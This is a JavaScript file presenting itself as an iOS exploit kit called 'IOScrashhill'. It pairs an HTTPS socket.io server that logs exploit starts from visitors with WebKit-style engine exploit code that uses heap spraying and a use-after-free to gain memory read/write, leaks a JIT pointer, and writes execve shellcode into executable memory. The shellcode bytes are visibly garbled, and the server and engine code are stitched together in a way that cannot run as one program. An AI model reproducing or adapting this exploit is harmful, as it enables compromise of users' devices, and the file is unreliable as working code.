// IOScrashhill_v1.3 Ali_punisher3 
var port = process.env.PORT || 666;
var debug = false;

var express = require("express");
const path = require("path");
const app = express();
const https = require("https");
const fs = require('fs');

const options = {
  key: fs.readFileSync('ssl/key.pem'),
  cert: fs.readFileSync('ssl/cert.pem')
};

const server = https.createServer(options, app);
const { Server } = require("socket.io");
const io = new Server(server);

app.use(express.static("./source"));

server.listen(port, () => {
	console.log("[SERVER] listening on *:" + port);
});

io.on("connection", (socket) => {
	socket.on("exploit_start", function (data) {
		console.log(
			"[EXPLOIT] Exploit has been started. (" + data.userAgent + ")"
		);
		console.log("[EXPLOIT] Supporting iOS " + data.exploitVersion);
	});

	socket.on("log_normal", function (data) {
		console.log("[EXPLOIT] " + data);
	});

    socket.on("error", function(data){
        console.log("[ERROR] " + data);
    });

	if (debug === true)
		console.log("[CLIENT] New client connection... (" + socket.id + ")");
});

_dview = null;

function u2d(low, hi) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0, hi);
    _dview.setUint32(4, low);
    return _dview.getFloat64(0);
}

print("aye")

var pressure = new Array(400);
var bufs = new Array(40000);

dgc = function() {
	for (var i = 0; i < pressure.length; i++) {
		pressure[i] = new Uint32Array(0x100000);
	}
}

function swag() {
	if(bufs[0]) return;

	dgc();

	for (i=0; i < bufs.length; i++) {
		bufs[i] = new Uint32Array(0x100*2)
		for (k=0; k < bufs[i].length; )
		{
			bufs[i][k++] = 0x41414141;
			bufs[i][k++] = 0xffff0000;
		}
	}
}

var arr = new Array(0x100);
var yolo = new ArrayBuffer(0x1000);
arr[0] = yolo;
arr[1] = 0x13371337;

var trycatch = "";
for(var z=0; z<0x2000; z++) trycatch += "try{} catch(e){}; ";
var fc = new Function(trycatch);

var not_number = {};
not_number.toString = function() {
	arr = null;
	props["stale"]["value"] = null;
	swag();
	return 10;
};

var props = {
	p0 : { value : 0 },
	p1 : { value : 1 },
	p2 : { value : 2 },
	p3 : { value : 3 },
	p4 : { value : 4 },
	p5 : { value : 5 },
	p6 : { value : 6 },
	p7 : { value : 7 },
	p8 : { value : 8 },
	length : { value : not_number },
	stale : { value : arr },
	after : { value : 666 } 
};

var target = [];
var stale = 0;
var before_len = arr.length; 
Object.defineProperties(target, props);
stale = target.stale;

stale[6] += 0x101;

var funcz = function() { fc() }

for(var z=0; z<0x20000; z++) fc();


var smsh = new Uint32Array(0x10)

for (i=0; i < bufs.length; i++) {
      for (k=0; k < bufs[i].length; )
      {
		if(bufs[i][k] != 0x41414141){
		    stale[6] = {'a':u2d(0x60, 0x1172600),'b':u2d(0,0),'c':smsh,'d':u2d(0x100,0)}
		    stale[5] = stale[6]
		    bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh

                    stale[6][4] = 0; // address, low 32 bits
		    stale[6][5] = 1; // address, high 32 bits == 0x100000000
		    stale[6][6] = 0x20;

		    if (smsh.length == 0x20) {
			print("win!")
			stale[5] = fc;

			/*
				jitleak:
				jsfunction + 0x18 = Executable
				Executable + 0x18 = JITCode
				JITCode + 0x10 = JIT area
			*/

			stale[6][4] = bufs[i][k-2] + 0x18;
			stale[6][5] = bufs[i][k-1]; /* read JSFunction */
			
			a=smsh[0] + 0x18;
			b=smsh[1];
			stale[6][4] = a;
			stale[6][5] = b; /* read JITCode */

			a = smsh[0] + 0x10;
			b = smsh[1];
			stale[6][4] = a;
			stale[6][5] = b; /* read JIT */

			a = smsh[0];
			b = smsh[1];
                        stale[6][4] = a;
                        stale[6][5] = b; /* set jit as backing for smsh, allowing write into fc's opcodes */
			
			shc=new Uint8Array([ // first result for execve shellcode on google
  0x41, 0xb0, 0x02, 0x49, 0xc1, 0xe0, 0x18, 0x49, 0x83, 0xc8, 0x17, 0x31,
  0xff, 0x4c, 0x89, 0xc0, 0x0f, 0x05, 0xeb, 0x12, 0x5f, 0x49, 0x83, 0xc0,
  0x24, 0x4c, 0x89, 0xc0, 0x48, 0x31, 0xd2, 0x52, 0x57, 0x48, 0x89, 0xe6,
  0x0f, 0x05, 0xe8, 0xe9, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
  0x2f, 0x73, 0x68, 0x000xc0, 0x0f, 0x05, 0xeb, 0x12, 0x5f, 0x49, 0x83, 0xc0,
  0x24, 0x4c, 0x89, 0xc0, 0x48, 0x31, 0xd2 ,0x02, 0x49, 0xc1, 0xe0, 0x18, 0x49,
  0x83, 0xc8, 0x17, 0x31,0x41, 0xb0, 0x02, 0x49, 0xc1,0xc0, 0x0f, 0x05, 0xeb, 0x12, 0x5f,
			])
			shc32=new Uint32Array(shc.buffer)

			var x=0;
			for(n=0; n<shc32.length; n++) smsh[n]=shc32[n];
			
			fc()
	
			break;
		    } else print("fail")


		    break;
		}
		k++;
		k++;
      }
}
